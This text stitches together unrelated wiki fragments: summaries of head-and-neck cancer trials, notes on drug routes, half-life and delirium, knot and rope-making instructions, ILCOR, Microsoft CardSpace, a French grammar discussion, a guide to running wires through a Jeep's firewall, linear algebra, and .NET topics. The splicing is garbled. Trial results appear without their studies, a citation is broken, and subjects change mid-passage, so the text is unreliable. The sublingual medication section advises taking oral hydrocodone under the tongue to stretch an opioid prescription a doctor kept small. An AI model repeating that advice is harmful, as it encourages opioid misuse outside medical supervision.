***Outcome: 10-year LRC neutrons 56% vs. photons/electrons 17% (SS); OS 25% vs. 15% (NS). Median OS 3 years vs. 1.2 years
***Toxicity: Severe toxicity worse in neutron arm, but no difference in &quot;life-threatening&quot; complications
***Conclusion: Fast neutron RT appears to be the treatment of choice for patients with inoperable/recurrent salivary gland tumors

==Recurrence==
===Surgery + Chemo-RT===
*'''GETTC/GORTEC''' (1999-2005) -- salvage surgery +/- reirradiation + chemotherapy
**Randomized. 130 patients, H&amp;N cancer, either recurrence or second primary in a previously irradiated area, no major sequelae. Treated with R0-R1 surgery. Arm 1) adjuvant salvage chemotherapy + re-irradiation vs. Arm 2) observation. RT given 60 Gy over 11 weeks with concurrent 5-FU and hydroxyurea
**'''2008''' PMID 18936479 -- &quot;Randomized Trial of Postoperative Reirradiation Combined With Chemotherapy After Salvage Surgery Compared With Salvage Surgery Alone in Head and Neck Carcinoma.&quot; (Janot F, J Clin Oncol. 2008 Oct 20. [Epub ahead of print])
***Outcome: DFS improved (HR 1.68, SS), OS no difference
***Late toxicity: 2-years Grade 3-4 RT arm 39% vs. observation arm 10% (p=0.06)
***Conclusion: Full-dose reirradiation combined with chemo after salvage surgery significantly improved DFS but not OS. Toxicity was higher

===Chemo Alone===
*'''EXTREME''' (2004-2005) -- Chemotherapy (cisplatin or carbo/5-FU) +/- cetuximab
**Randomized. 442 patients with recurrent or metastatic SCC of H&amp;N. Arm 1) chemotherapy (cisplatin 100 mg/m2 or carbo AUC 5 + 5F-FU 1000 mg/m2) x6 cycles vs. Arm 2) same chemotherapy + cetuximab 250 mg/m2 x6 cycles. If stable disease, cetuximab until disease progression or toxicity
**'''2008''' PMID 18784101 -- &quot;Platinum-based chemotherapy plus cetuximab in head and neck cancer.&quot; (Vermorken JB, N Engl J Med. 2008 Sep 11;359(11):1116-27.)
***Outcome: Median OS chemo 7 months vs. chemo+cetuximab 10 months (SS)
***Toxicity: Grade 4 comparable except sepsis worse in cetuximab arm
***Conclusion: Cetuximab + platinum chemotherapy improved overall survival compared with chemotherapy alone

==Treatment Technique==
===Setup===
*'''Princess Margaret''' (2006-2008) -- standard immobilization mask vs skin-sparing immobilization mask
**Randomized. 762 CBCT scans in 20 patients. Arm 1) standard mask (SM) vs Arm 2) skin-sparing mask (SSM) modified with low neck cutouts
**'''2010''' PMID 20056344 -- &quot;Cone-beam CT assessment of interfraction and intrafraction setup error of two head-and-neck cancer thermoplastic masks.&quot; (Velec M, Int J Radiat Oncol Biol Phys. 2010 Mar 1;76(3):949-55. Epub 2010 Jan 7.)
***Outcome:  Initial interfraction sigma SM 1.6 mm or 1.1 degrees vs SSM 2.0 mm and 0.8 degrees. No difference after CBCT correction. Initial intrafraction sigma &lt;1 mm and &lt;1 degree for both masks.
***Conclusion: Interfraction and intrafraction setup error not significantly different between masks. Mask cutouts should be considered to reduce skin toxicity

*'''Karolinska Hospital''' (Sweden)(1998-2001) -- head mask vs head-and-neck mask setup
**Randomized. 241/260 patients. H&amp;N cancers excluding NPC. Arm 1) Head mask vs. Arm 2) Head-and-shoulder mask. Both Posicast thermoplastic masks. Assessed reproducibility (port films and table positions), patient tolerability (fit, pain, movement within, claustrophobia), and skin damage
**'''2005''' PMID 15629618 -- &quot;Randomized trial on two types of thermoplastic masks for patient immobilization during radiation therapy for head-and-neck cancer.&quot; (Sharp L, Int J Radiat Oncol Biol Phys. 2005 Jan 1;61(1):250-6.)
***Outcome: No difference in reproducibility of setup
***Toxicity: 
****Claustrophobia: head mask 45% vs. head-and-shoulder mask 58% (SS). Otherwise no difference in tolerability. 
****Skin toxicity (Grade 3): head mask 21% vs. head-and-shoulder mask 39% (SS)
***Conclusion: Smaller head masks reduced claustrophobia and skin reactions without compromising reproducibility of the setup.

===IMRT===
'''IMRT salivary function'''
*'''Prince of Wales Hospital; 2007''' (Hong Kong)(2001-2003) PMID 17971582 -- &quot;Prospective randomized study of intensity-modulated radiotherapy on salivary gland function in early-stage nasopharyngeal carcinoma patients.&quot; (Kam MK, J Clin Oncol. 2007 Nov 1;25(31):4873-9.)
**Randomized. 60 patients with T1-2bN0-1 nasopharynx. Arm 1) IMRT 66 Gy (CTV=GTV + 1cm; at-risk anatomic sites; LN Levels IB-II, LN upper Level V, LN retropharyngeal; PTV=CTV+3mm), lower neck LN+ 66 Gy anterior field, LN- 54-60 Gy + intracavitary BT boostvs. Arm 2) 66 Gy 2D + intracavitary BT boost
**Outcome: observer-rated severe xerostomia IMRT 39% vs. 2D-RT 82% (SS), stimulated parotid flow (SS), unstimulated parotid flow (SS), but no difference in patient-reported feeling of xerostomia
**Conclusion: IMRT superior in preserving objective parotid function, but no difference in patient-reported benefit
**Editorial (PMID 17971579): Observer-rated scoring underestimates patient reports and has low agreement among various observers. Suspect sparing of parotid alone not sufficient. Parotid gland produces saliva without mucins (lubricants, bind water, and provide selective permeability barrier). Mucin-secreting glands (e.g. minor salivary glands, submandibular glands) produce &lt;10% saliva but &gt;50% mucins. May need to spare these glands as well for subjective feeling of benefit

*'''Queen Mary Hospital; 2006''' (Hong Kong)(2000-2004) PMID 17145528 -- &quot;Xerostomia and quality of life after intensity-modulated radiotherapy vs. conventional radiotherapy for early-stage nasopharyngeal carcinoma: initial report on a randomized controlled clinical trial.&quot; (Pow EH, Int J Radiat Oncol Biol Phys. 2006 Nov 15;66(4):981-91.) 
**Randomized. 51 patients, Stage II (T2N0-1, AJCC 1997). Arm 1) conventional RT 68 Gy, neck 66 Gy vs. Arm 2) IMRT, GTV dose 68-72 Gy, PTV 66-68 Gy. Stimulated whole (SWS) and parotid (SPS) saliva flow evaluated, QoL SF-36, EORTC Core, EORTC QLQ-H&amp;N35 questionnaires. Minimum F/U 1 years
**1-year outcome: 25% whole flow (SWS) IMRT 50% vs. 2D 5% (SS), 25% parotid flow (SPS) 83% vs. 9% (SS). At 2 months, both group had xerostomia, but IMRT group improved significantly better over time. Also improvements in QoL
**Conclusion: IMRT significantly better than conventional RT for salivary function and QoL

===Middle ear ventilation tube===
*'''Hong Kong; 2002''' PMID 12512893 -- &quot;Randomized evaluation of the audiologic outcome of ventilation tube insertion for middle ear effusion in patients with nasopharyngeal carcinoma.&quot; (Ho WK, J Otolaryngol. 2002 Oct;31(5):287-93.)
**Randomized. ? patients. NPC and middle ear effusion. Arm 1) pre-RT ventilation tube insertion vs. Arm 2) observation. Audiologic assessment throughout. F/U 4 years
**Outcome: No difference in hearing changes up to 4 years
**Conclusion: Ventilation tube insertion before RT did not offer hearing benefit

===Time of radiation===
*'''NCIC HN3''' -- morning RT vs. afternoon RT
**Randomized, proof of principle. 205/216 patients, receiving primary or postop RT. Arm 1) morning (8-10 AM) RT vs. Arm 2) afternoon (4-6 PM) RT. Primary outcome mucositis

[Epub ahead of print])
***Outcome: Grade 3+ mucositis AM RT 53% vs. PM RT 62% (p=0.2). In patients with RT dose 66-70 Gy, 45% vs. 67% (SS). Also longer time-to-mucositis &gt;7.9 weeks vs. 5.6 weeks (SS). Significant benefit in patients who continued to smoke 43% vs. 76% (SS)
***Conclusion: Morning RT associated with significantly less weight loss, and reduction in oral mucositis in patients getting &gt;=66 Gy

***Outcome: No difference in degree of mucositis; 2-week mucositis worse in placebo group
***Conclusion: Mouth rinse may lead to some improvement


'''''Honey'''''
*'''Egypt''' (2005-2006) -- chemo-RT +/- honey
**Randomized. 40 patients with H&amp;N cancer, treated with chemo-RT with significant area of oral or oropharynx mucosa in treatment field. Arm 1) topical application of pure natural honey vs. Arm 2) no honey. Evaluated weekly, aerobic cultures and candida colonisation assessed
**'''2008''' PMID 18485252 -- &quot;Honey as topical prophylaxis against radiochemotherapy-induced mucositis in head and neck cancer.&quot; (Rashad UM, J Laryngol Otol. 2008 May 19:1-6. [Epub ahead of print])

***Toxicity: No significant difference
***Conclusion: Iseganan oral solution safe but didn't reduce risk of ulcerative mucositis

===Xerostomia===
====Accupuncture====
*'''South Korea'''
**Randomized. 12 patients with H&amp;N cancer and radiation-induced xerostomia. Arm 1) real acupuncture vs. Arm 2) sham acupuncture BIW x 6 weeks. Measured whole stimulated and unstimulated salivary flow rate, and questionnaire at 3 and 6 weeks after acupuncture

      <text xml:space="preserve">Transdermal medication use:

Transdermal means &quot;across the skin&quot;. This is the application of medication to the skin for absorption into the body. 

Although this has been done for hundreds of years for medication that actually benefits the skin, only recently has it been able to take medications into the blood stream. This is because of new ways of &quot;piggybacking&quot; the medication onto other chemicals or vehicles that take it through the skin and into the bloodstream. 

Medications delivered in this way can usually be delivered at a lower dose than the oral route, and the skin may actually act as a reservoir, allowing a slow but steady delivery into the body.

This knot is the same as a fisherman's bend, except that instead of joining two ropes together, a single rope is doubled over and then joined to itself forming a loop.

Another way to tie it is to make a slip knot and then use the running end to tie an overhand knot around the standing end.

==Behind the Scenes==
*Where do these treatment protocols come from?
*Who decides what CPR is?
*Why is there variation in standards - isn't one way of doing things better than the others?

This section is designed to lift the hood and show you how first aid standards are derived.

==ILCOR==
'''[http://www.ilcor.org/ The International Liaison Committee on Resuscitation (ILCOR)]''' was formed in 1992 to provide an opportunity for the major organizations in resuscitation to work together on CPR and ECC (Emergency Cardiovascular Care). The name was chosen in 1996 to be a deliberate play on words relating to the treatment of sick hearts - ''&quot;ill cor&quot;'' (''cœur'' is French for ''heart'').

ILCOR is composed of the American Heart Association (AHA), the European Resuscitation Council (ERC), the Heart and Stroke Foundation of Canada (HSFC), the Australian and New Zealand Committee on Resuscitation, the Resuscitation Councils of Southern Africa (RCSA), and the Inter American Heart Foundation (IAHF).

===Mission Statement===
&quot;To provide a consensus mechanism by which the international science and knowledge relevant to emergency cardiac care can be identified and reviewed. This consensus mechanism will be used to provide consistent international guidelines on emergency cardiac care for Basic Life Support (BLS), Paediatric Life Support (PLS) and Advanced Life Support (ALS). While the major focus will be upon treatment guidelines, the steering committee will also address the effectiveness of educational and training approaches and topics
related to the organisation and implementation of emergency cardiac care. The Committee will also encourage coordination of dates for guidelines development and conferences by various national resuscitation councils. These international guidelines will aim for a commonality supported by science for BLS, ALS and PLS.&quot;

 | journal = Resuscitation
 | volume = 67
 | issue = 2-3

 | doi = 10.1016
 }}&lt;/ref&gt;

===Objectives===
* Provide a forum for discussion and for coordination of all aspects of cardiopulmonary and cerebral resuscitation worldwide.
* Foster scientific research in areas of resuscitation where there is a lack of data or where there is controversy.
* Provide for dissemination of information on training and education in resuscitation.
* Provide a mechanism for collecting, reviewing and sharing international scientific data on resuscitation.
* Produce as appropriate statements on specific issues related to resuscitation that reflect international consensus.

===Activities===
ILCOR meets twice each year usually alternating between a venue in the United States and a venue elsewhere in the world. ILCOR produced the first International CPR Guidelines in 2000, and revised protocols in 2005 (published concurrently in the scientific journals [http://www.resuscitationjournal.com/issues/contents?issue_key=TOC@@JOURNALS@RESUS@0067@0002 Resuscitation] and [http://circ.ahajournals.org/content/vol112/22_suppl/ Circulation]). A total of 281 experts completed 403 worksheets on 275 topics, reviewing more than 22000 published studies to produce the 2005 revision. The standard revisions cycle for resuscitation is five years. The last revision was in 2005, so the next will be in 2010.

Microsoft Cardspace '''(codenamed: Info Card)''' is a part of Microsoft's new initiative to construct an identity metasystem where different identities shall be stored and authentication provided by a single system.



== Digital Identity ==

People have multiple identities. For an immigration officer at an airport, a person is identified as a citizen of some country while to a traffic policeman who catches him for overspeed, he is a driver from a particular locality. In a similar way, a person on the net might want to purchase grocies from a grocer, book air tickets for a holiday and order a pizza from the nearest pizza shop through the computer. Hence a digital identity is needed to identify him and this may vary depending upon the vendor

This could be realized through a large-scale system of computers or a metasystem. No single system can issue identities or permissions especially when multiple businesses and multiple transactions are involved. This issue is tackled with by the use of a metasystem wherein each organization issues its own card or passport for the user.

By the use of standards as WS-Security, WS-Trust, WS-MetadataExchange, and WS-SecurityPolicy, it will be possible for the ''identity metasystem'' to work with multiple identities issue by different organizations.

Identities are usually assigned based on security tokens which consists of a set of claims. Each claim is a component which identifies the user such as username, address, telephone number,etc. which are unique to that particular user. The set of claims required to authenticate an user might vary from site to site and with this set of claims, the digital identity. These security tokens could be created using  Security Assertion Markup Language (SAML), a new standard created by the industry group OASIS.

== Digital Identities and Windows Cardspace ==

Windows Cardspace implements the system of digital identity in Microsoft's identity metasystem effort by offering the user a system of cards from which the user might be able to select for authentication to different websites. Each of these cards is provided by an ''identity provider''. These cards are authenticated by ''relying parties'' representing that particular business establishment.

== Internal Working ==

As seen earlier, Windows Cardspace uses a system of cards to authenticate an user. When a new card is created, it gets stored as a '''.CRD''' file. The .crd file is composed of metadata. It contains the card name, card image details and STS details. The URL of the location where user information is located is actually specified in the STS section. So, the card simply contains the address or location of the file which contains user information and not the information itself.

Shouldn't it be &quot;Jean et Paul, vous vous êtes levés assez tard.&quot;
Not avoir but être should be used?

I have the exact same doubt...can a native speaker validate this??

:I am going to (try to) answer, even though I can see the question has been asked a long time ago...
:The verb être is correct in this example. The verb here is ''se lever'', the pronominal form of ''lever'' (the difference in meaning is that while ''lever'' would mean ''to get up (someone else)'' (even though it doesn't mean anything with this verb), ''se lever'' means ''to get up (oneself)''. Pronominal verbs are ALWAYS conjugated with ''être''.
:This works with potentially every transitive French verb. Here you can see that the verb is pronominal because of the second ''vous'' which is the form of ''se'' at the 2nd pers plural. I hope I was clear, I am not used to explain things like that in English. --[[User:Am13gore|AurélieM]] &lt;sup style=&quot;font-size:9px;&quot;&gt;[[User talk:Am13gore|Hi!]] &lt;/sup&gt; 23:30, 8 June 2009 (UTC)

==Baigner==
The audio sample doesn't match the IPA.  Here's one that does: [http://www.forvo.com/word/baigner#fr Baigner in French].  Note the &quot;e&quot; in the IPA which is typical of &quot;-er&quot; endings in French.

==Should You Go?==
SLC is a unique college with no majors, fraternities, sororities, and practically no sports. It is also one of the top 10 most expensive colleges. Needless to say, it is not for everyone. But those who love it do so partly because of its 6:1 student-teacher ratio, or its atmosphere of learning for the sake of learning.

      <text xml:space="preserve">== Opening the Factory Firewall Penetration ==

[[Image:JeepLiberty_FirewallPenetration_Interior.jpg|thumb|left|Fig 1 - Trim Removal]]
[[Image:JeepLiberty_FirewallPenetration_Insulation.jpg|thumb|right|Fig 2 - Insulation Removal]]
[[Image:JeepLiberty_FirewallPenetration_Firewall.jpg|thumb|right|Fig 3 - Firewall]]

Ok, so you want to get some wires from the passenger compartment to the engine compartment.  Maybe your running some wires for that new set of fog lights, a power wire for that bangin' sub in the back or power wires and coax for that big honkin' amateur radio that you want to use mobile.  The installation instructions for the DC fog light kit show the wires being run through the seal around the main wiring harness.  That is OK if you have some small 18-20ga wires to run, but if you have 10-12ga power wires and good RG-8 coax to get thru the firewall you might have some problems. 

Luckily DC has placed an oval penetration in the firewall that will accommodate these larger wires.  This page will demonstrate how I found this opening and utilized it for my own needs.

First off, you will need to remove the drivers side kick panel.  Pull up on the lower door trim piece and pull out on the kick panel; these both use metal spring clips to fasten to the body (Fig 1).

Once you have the kick panel removed, grab the edge of the carpet and pull toward the brake pedal.  This will allow you to see the sound insulation on the inside of the firewall.  You can see where this insulation fits around the main wiring harness (Fig 2).  Take note of the bolt coming thru the small plastic fitting.  This bolt will help you locate the firewall plug later.

Once you have the insulation pulled back you will see the white plastic ring around the main wiring harness.  Just below that over at the joint of the firewall and the left side of the passenger compartment you will see a black plastic plug.  This is the plug for the penetration you will open up.  Fig 3 shows this penetration with my wires going out.

Now for the fun part.  Pull out your drill, cordless if ya got it, and grab a good-sized bit, around 3/8th or 1/2.  Drill through the center of the plastic plug and you should be able to pull the plug right out (Note:I did not use this method, but others have mentioned it and it seems better than the contortionists trick I used to get to mine from the engine side).  At this point you will have revealed an opening about 1/2&quot; x 1&quot;.  Go ahead and run your wires; a coat hanger or other thin, flexible rod will help here.  Once done, put the insulation, carpet and cabin trim pieces back in place and you are done!  Don't forget to purchase or find some RTV or silicone sealant to seal the opening once you have run everything through.

A step by step photo walkthrough can be found in the gallery below:

      <text xml:space="preserve">Hi Micheal, thanks for the compliment!

I have no problem with you posting the information, in fact it would be a second location for the information and that can only be helpful. I just wanted to get the information out so that anyone who came after me would not have to search thru all of the posts and other information to find out what they need to do. If you want to go ahead and grab the information as posted on my original page: http://home.comcast.net/~corwyyn/firewall-penetration.html feel free to do so. Please note that this page will most likely disappear at the end of the month so if you want it now is the time! I am going to try valiantly to update the images and make some minor additions, but that may have to wait until after this weekend as my mother will be moving down here to Tempe and I will need to help unpack the truck. As soon as I get everything ready I could always go to the wiki site and do the update so that shouldn't be a problem.

Again, thanks for the offer and the help.

Regards,

Kevin,

I really liked your Firewall Penetration Guide! I found it very informative and useful. I would love to use it in a project I'm involved with called Wikibooks, so I'm seeking your permission.

Wikibooks http://wikibooks.org is a collection of free non-fiction books (only textbooks so far) that is collaboratively-edited by volunteers from around the world. You might have heard of our sister project, Wikipedia ( http://wikipedia.org ), which is a very large online encyclopedia that, in less than four years time, amassed over 400,000 articles - just in the English language version. However, the Wikibooks project is just starting to write our first textbooks and we hope to duplicate Wikipedia's success in about the same amount of time.

I'd like to include your materials in this Wikibook http://en.wikibooks.org/wiki/Jeep_Liberty To get a sense of the freedom of Wikibooks, you could even edit this without registration right now.

However, we can only use your materials if you are willing to grant permission for us to use your above referenced work under terms of the GNU Free Documentation License.

== Change of Basis ==

It was shown earlier that a square matrix can represent a linear transformation of a vector space into itself, and that this matrix is dependent on the basis chosen for the vector space.  We will now show how to change the basis of a given vector space

Suppose we have some vector space whose basis is given by the set &lt;math&gt; A = a_{1}, a_{2}, \ldots, a_{n}&lt;/math&gt; and we would like to change it to the set &lt;math&gt; B = b_{1}, b_{2}, \ldots, b_{n}&lt;/math&gt;.  The basis '''''B''''' still belongs to vector space aforementioned, so its vectors can be expressed as a linear combination [''Eq. 1'']

&lt;math&gt; b_1 = p_{11}a_1+p_{12}a_{2}+\ldots+p_{1n}a_{n}&lt;/math&gt;,

&lt;math&gt; b_2 = p_{21}a_1+p_{22}a_{2}+\ldots+p_{2n}a_{n}&lt;/math&gt;,

&lt;math&gt;\ldots&lt;/math&gt;

&lt;math&gt; b_n = p_{n1}a_1+p_{n2}a_{2}+\ldots+p_{nn}a_{n}&lt;/math&gt;

Each vector of the set '''''B''''' has a coordinate matrix with respect to the basis we started off with, namely the set designated as '''''A'''''.  We represent this as

&lt;math&gt; \begin{bmatrix}
  b_1 \\
  \end{bmatrix}_{A} = \begin{bmatrix}
                       p_{11} \\
                      p_{12} \\
                      \vdots \\

  \end{bmatrix}_{A} = \begin{bmatrix}
                       p_{21} \\
                      p_{22} \\
                      \vdots \\

                      p_{nn} \\
                      \end{bmatrix}
&lt;/math&gt;

Setting these coordinate matrices as the columns of a matrix P gives us a '''transition matrix'''.  This transition matrix transforms the original basis '''''A''''' to a new basis '''''B''''' of some vector space.  The transition matrix is actually the transpose of [''Eq. 1''] that we saw earlier

&lt;math&gt; P = \begin{bmatrix}

\begin{bmatrix}
  b_1 \\
  \end{bmatrix}_{A}

\begin{bmatrix}
  b_2 \\
  \end{bmatrix}_{A}

\cdots

\begin{bmatrix}
  b_n \\
  \end{bmatrix}_{A}
\end{bmatrix} = 
\begin{bmatrix}
p_{11} &amp; \cdots &amp; p_{n1} \\
p_{12} &amp; \cdots &amp; p_{n2} \\
\vdots &amp; \ddots &amp; \vdots \\
p_{1n} &amp; \cdots &amp; p_{nn} \\
\end{bmatrix}
&lt;/math&gt;

To summarize, in order to find the transition matrix from some basis '''''F''''' to some basis '''''G''''', we must compute the coordinate vector for each element of our original basis '''''F''''' with respect to the other basis '''''G'''''.  The matrix whose columns are formed by the coordinate vectors is the transition matrix.

==Proof==
=====''Theorem 1''=====
''If '''''P''''' is the transition matrix from the basis '''A''' to the basis '''Z''', and '''''&amp;beta;''''' is an element of the vector space, then it follows that

&lt;math&gt;P\begin{bmatrix}
  \beta \\
  \end{bmatrix}_{Z} =
\begin{bmatrix}
  \beta \\
  \end{bmatrix}_{A}&lt;/math&gt;

====Proof====

&lt;math&gt;
\beta = b_{1}z_{1} + b_{2}z_{2} + \cdots + b_{n}z_{n}&lt;/math&gt;
&lt;math&gt; ~~~= b_{1}(p_{11}a_{1} + \cdots + p_{1n}a_{n})+ \cdots + b_{n}(p_{n1}a_{1} + \cdots + p_{nn}a_{n})&lt;/math&gt;

&lt;math&gt; ~ = (b_{1}p_{11} + \cdots + b_{n}p_{n1})a_{1} + \cdots + (b_{1}p_{1n} + \cdots + b_{n}p_{nn})a_{n}&lt;/math&gt;

&lt;math&gt;\therefore &lt;/math&gt;

&lt;math&gt; 
\begin{bmatrix}
  \beta \\
  \end{bmatrix}_{A} = 
\begin{bmatrix}
(b_{1}p_{11} + \cdots + b_{n}p_{n1}) \\
 \vdots \\
(b_{1}p_{1n} + \cdots + b_{n}p_{nn}) \\
 \end{bmatrix}&lt;/math&gt;

&lt;math&gt; =
\begin{bmatrix}
  p_{11} &amp; \cdots &amp; p_{n1} \\
  \vdots &amp; ~ &amp; \vdots \\
  p_{1n} &amp; \cdots &amp; p_{nn} \\
\end{bmatrix}
\begin{bmatrix}
 b_{1} \\
 b_{2} \\
 \vdots \\
 b_{n} \\
 \end{bmatrix} = P\begin{bmatrix}
  \beta \\
  \end{bmatrix}_{Z} &lt;/math&gt;

&lt;math&gt; \Box &lt;/math&gt;

      <text xml:space="preserve">Some medicines can be given sublingual, which means &quot;under the tongue&quot;. The reason for this method of administration is that some medications can enter the bloodstream better or faster this way. 

For example, B12 is a vitamin that for decades was given as an injection because when someone has Pernicious Anemia they cannot absorb it from the intestines due to a lack of a chemical called intrinsic factor that &quot;grabs&quot; it and pulls it into the bloodstream. A few years ago it was noted that if given sublingual, it would be adequately absorbed, eliminating the need for an injection. 

Another example is when a patient in Hospice care is near death, unable to swallow but having pain, the pain medication can be given as a liquid under the tongue, where it is absorbed quickly and gives rapid pain relief. 

A pill designed to be given orally will rarely be able to be administered sublingually. A pharmacist can tell you if a certain medication has a coating and absorption profile that will allow this form of administration.

An example of a pain medication intended to be taken orally that can be taken sublingually, if you don't mind a slight bitter taste, is hydrocodone.  Approximately 1/3 of an oral dose has the same effects when taken sublingually.  This method of sublingual dosing has been tried when a patient's Dr. does not prescribe enough of the medication in quantity to be taken orally to subdue the patient's severe pain.

      <text xml:space="preserve">Every medication has a certain amount of time that it remains &quot;active&quot; before the body begins to metabolize or excrete the medication. The amount of time it lasts in the body before it is half gone is called the '''half life'''. 

The half life is an important concept for clinicians;
*When treating infections, the antibiotic needs to be present long enough and at a high enough dose to kill the infection
*When taking a sleeping medication, you want it to work only so long that you wake up refreshed, not groggy
*When being treated for blood pressure problems (Hypertension) or cholesterol problems (Hyperlipidemia) you'd like the medication to work all day.

Some medical conditions will either shorten or prolong the half life of a medication, which is important for the clinician to consider, to avoid over or under dosing. 
* Kidney disease will reduce the excretion of medications that are primarily eliminated through the kidney, allowing it to increase in the blood. This is predictable and should be taken into consideration by the clinician
* Certain medications interfere with the metabolism of other medications, either by speeding up, or slowing down, the metabolism. The clinician has the information to know what does what to what, to avoid this problem.
* Certain foods can interfere with metabolism of medication. Grapefruit and grapefruit juice can cause problems with this, and the clinician may tell one to avoid this food.

Mathematically and biologically, it takes four half lifes for a medication to reach ''' steady state''', or put another way, a consistent level in the body. For a medication that has a 4 hour half life, it will take 4 doses every four hours to reach the correct level. For this reason, sometimes clinicians advise &quot;to take two the first time&quot;, which reduces the amount of time before reaching a steady state.

Also, when a medication has to be stopped, it is often desirable to reduce it over time, instead of stopping it all at once. This may reduce the uncomfortable effects of stopping it. Examples include:
*Narcotic addiction: stopping the narcotics all at once may bring on serious and severe side effects, whereas reducing them a little at a time is more tolerable and comfortable.
*Paxil (paroxetine) is a difficult medication to stop all at once, and should be tapered over time
*Prednisone, and other steroids, may need to be tapered for a different reason...their presence in the body will allow the adrenal glands to &quot;go on vacation&quot;, and stopping them suddenly after several days may cause serious problems, whereas slowing them down will allow the adrenal glands to &quot;recover&quot; from the vacation.

      <text xml:space="preserve">Delirium (or the state of being delirious) is considered a temporary dysfunction of the brain. 

The brain is a very complex organ, of course, and although it is resistant to being &quot;knocked off kilter&quot;, certain things can do this.

* Many people have experienced delirium when drinking too much alcohol. This is induced by a chemical, is relatively temporary, and its effects are pretty well known. In too high a dose, the delirium can advance to unconsciousness, and even respiratory depression, which can lead to death from the body being unable to breathe on its own.
* Simple infections, like urinary infections in the elderly, can cause a delirium, which resolves a couple of hours after the first dose of antibiotic.

Delirium is confused with Dementia, but the two are quite different. See Dementia.

      <text xml:space="preserve">[[Image:Rope maker.png|thumb|400px|Rope-making apparatus]]
Making rope requires some simple apparatus which you can make yourself easily enough.  The first apparatus (we'll call it the ''twister'') is used for twisting three strands of twine (or smaller rope).  When making the twister, clamp the two boards that form the handles together tightly and drill three holes through both at the same time.  This will ensure that they line up.  The hook/crank portion of the twister can be made from coat hanger wire.  First make the two 90° bends in the center, then pass them through the holes in the handles.  Finally, form the hooks on one end and the other 90° bend on the other. (This final bend prevents the crank from slipping out of the holes in the handle).

As the strands are twisted, they will tend to grab one another and twist together.  To make rope, this tendency has to be controlled.  This is done with a second apparatus (we'll call it the ''separator'').  It consists of a board with three holes drilled in it, forming the points of an equilateral triangle.  These points should be at least six inches away from one another, and should be large enough to pass the strands of twine through.

To make rope, cut three pieces of twine about 33% longer than the desired rope.  Pass each strand through a hole in the separator, then tie a non-slip loop in the end of each (a figure-eight on a bight works well for this).  We will call this end of the strands the ''free end''.  Slip these loops over a hook of some sort, and pull the strands straight.  Bunch the ends opposite the loops together, and tie them off, again in a loop (and again, a figure-eight on a bight works well for this).  We will call this end the ''bound end''.  Make sure that the three strands are the same length from one loop to the other.  Hand the bound end to a helper, then attach the loops on the free end to the hooks on the twister.  Pull the twister away from the bound end (still affixed firmly to another hook) until the strands are straight and tight.  Then slide the separator towards the common end.  Start cranking the twister so that the hooks rotate.  As you crank, your helper will allow the three strands on his side of the separator to twist together.  As they do this, the helper will slide the separator towards you, going only as fast as the strands bind to one another.  Be careful to keep the strands tight as you do this so that they do not bind to one another on your end of the separator.  Continue twisting until the separator reaches the twister.  Then tie a knot in the free end of the rope, unhook it from the twister, and slide the separator off.  Tie a stopper knot, or bind the end with tape.  Then cut off the few inches of untwisted strand that remain (or make a back splice).  Finish the opposite end in the same manner.  Voila!  You now have a rope!

      <text xml:space="preserve">==Orthogonal Sets==

Given a set &lt;math&gt; A = ( a_{1},a_{2}, \ldots ,a_{n} )&lt;/math&gt;, where &lt;math&gt; a_{1}&lt;/math&gt; through &lt;math&gt;a_{n}&lt;/math&gt; are nonzero vectors of the same dimension, is an '''orthogonal set''' if

&lt;math&gt; a_{i} \cdot a_{j} = 0 &lt;/math&gt;

where &lt;math&gt;i \ne j&lt;/math&gt;.

So, for example, if one has a set of 3 vectors with the same dimension (for example &lt;math&gt; 4 \times 1&lt;/math&gt;) and taking the dot product of each vector with each other vector all equal zero, it is an orthogonal set.  This is illustrated below.

=====Example of Orthogonal Set=====

&lt;math&gt;

\boldsymbol{\Omega} = ( \omega_{1}, \omega_{2}, \omega_{3} )&lt;/math&gt;

&lt;math&gt;
\omega_{1} = \begin{bmatrix}
             1 \\
             0 \\
             2 \\
             1 \\
             \end{bmatrix} ,
\omega_{2} = \begin{bmatrix}
             2 \\
             3 \\
             -2 \\
             2 \\
             \end{bmatrix},
\omega_{3} = \begin{bmatrix}
             1 \\
             0 \\
             0 \\
             -1 \\
             \end{bmatrix}
&lt;/math&gt;

We see that

&lt;math&gt; \omega_1 \cdot \omega_2 = 0 &lt;/math&gt;

&lt;math&gt; \omega_1 \cdot \omega_3 = 0 &lt;/math&gt;

&lt;math&gt; \omega_2 \cdot \omega_3 = 0 &lt;/math&gt;


Thus, &lt;math&gt; \boldsymbol{\Omega}&lt;/math&gt; is an orthogonal set of vectors.

There are three types of caching supported by .NET 3.0

* Absolute Expiration Caching
* Sliding Caching
* Cache Dependency Expiration caching

== Absolute Expiration Caching ==

This is a form of caching wherein the expiration time is specified in advance. After a specific period of time, the contents of the cache get deleted.

== Sliding Caching ==

Here, a time span is specified upto which the program checks for access. If no individual has accessed the site till the time span has expired, then the contents of the cache get deleted. So here, the timespan of the cache depends upon the popularity of the site.

== Cache Dependency Expiration ==

In cache dependency expiration, the timespan of the cache depends on when the particular item on which the data is dependent is changed.</text>

Windows Workflow Foundation is a new component introduced by .NET Framework 3.0.

&lt;blockquote&gt;
A workflow is a reliably repeatable pattern of activity enabled by a systematic organization of resources, defined roles and mass, energy and information flows, into a work process that can be documented and learned. Workflows are always designed to achieve processing intents of some sort, such as physical transformation, service provision, or information processing.
&lt;/blockquote&gt;

== Activites ==

A workflow is a set of activities. Each of these activities is a class which performs a particular operation. In Windows Workflow Foundation (WWF), they are coded using a language called XAML which has been introduced specifically for this purpose.

Workflow activities are classes which are created by the author and contains methods programmed by the author which could be called and executed by the workflow. There are different types of activities: Basic activities and composite activities. Basic activities are single activities executed by the workflow while composite activities are made up of activities. Apart from this, users can also create custom activities based on existing activities.

Typically, '''the WWF is made up of a number of activities or individual programs which are interlinked using XAML code'''. Hence, we need to include the namespace '''System.Workflow.ComponentModel'''.

== Types of Workflow ==

There are two types of workflows provided by WWF.

* Sequential Workflow
* State-machine workflow

== Components of WWF ==
WWF is made up of the following components:

&lt;p align=&quot;center&quot;&gt;
* Base Activity Library
* Runtime Engine
* Runtime Services
* Hosts
&lt;/p&gt;

=== Base Activity Library ===
The base activity library usually contains some well-known or frequently used activities which are executed by the workflow. Besides, users can also add custom-built activities for use into the workflow. These could be activities which have been developed from existing activites or activities that have been coded from scratch. The base activity library is quite similary to the base class library(BCL) of the .NET framework and Java Class Libraries.

=== Runtime Engine ===

Another component which forms a part of Windows Workflow Foundation is the Runtime Engine. As the name implies, this consist of the runtime classes and services required for the program to run. These runtime services of the runtime engine perform the same role as providers.

=== Runtime Services ===

